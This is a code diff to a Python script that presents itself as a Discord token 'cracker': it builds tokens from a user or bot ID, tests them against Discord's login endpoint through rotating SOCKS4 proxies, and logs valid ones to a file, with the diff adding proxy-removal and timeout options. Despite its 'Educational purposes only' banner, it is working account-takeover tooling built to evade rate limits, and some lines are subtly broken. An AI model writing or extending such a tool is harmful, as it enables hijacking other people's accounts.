@@ -14,10 +14,16 @@ invaild = 0
 total_proxy = 0
 bad_proxy = 0
 
-mode = input("Cracker Mode | User/Bot | 0 / 1: ")
 
+mode = input("Cracker Mode | User/Bot | 0 / 1: ")
+rp = bool(input("Auto Remove Proxy? True/False: "))
+ptimeout = input("Proxy Timeout (blank = default): ")
 userid = base64.b64encode((input("User / Bot ID: ")).encode("ascii"))
 userid = str(userid)[2:-1]
+if ptimeout == '':
+    proxyTimeout = 6000
+else:
+    proxyTimeout = int(ptimeout)
 print("WARNING: Educational purposes only!")
 
 proxies = set()
@@ -51,7 +57,7 @@ while userid == userid:
     proxy_form = {'http': f"socks4://{proxy}", 'https': f"socks4://{proxy}"}
 
     try:
-        login = requests.get('https://discordapp.com/api/v9/auth/login', headers=checkerheaders, proxies=proxy_form, timeout=6000)
+        login = requests.get('https://discordapp.com/api/v9/auth/login', headers=checkerheaders, proxies=proxy_form, timeout=proxyTimeout)
         if login.status_code == 200:
             print(Fore.GREEN + '[+] VALID' + ' ' + token)
             f = open('done.txt', "a+")
@@ -62,5 +68,7 @@ while userid == userid:
             print(Fore.RED + '[-] INVALID' + ' ' + token)
             invaild += 1
     except:
-        list(proxies).remove(proxy)
+        if rp == True:
+            list(proxies).remove(proxy)
+        print(Fore.YELLOW + f'[-] BAD PROXY: {proxy}')
         bad_proxy += 1
